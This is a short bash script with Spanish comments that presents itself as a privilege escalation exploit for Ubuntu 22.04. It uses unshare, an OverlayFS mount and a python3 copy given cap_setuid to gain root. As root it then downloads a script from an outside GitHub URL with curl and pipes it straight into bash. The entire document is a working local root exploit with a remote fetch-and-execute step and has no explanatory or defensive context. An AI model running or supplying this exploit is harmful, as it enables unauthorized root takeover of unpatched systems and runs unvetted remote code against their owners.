#!/bin/bash

# Escalada de privilegios en Ubuntu 22.04
# Y ejecución de script con permisos root
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"curl -s https://raw.githubusercontent.com/DriveSec/scripts/main/recon_ubuntu_system.sh | bash\")'";rm -rf l u w m
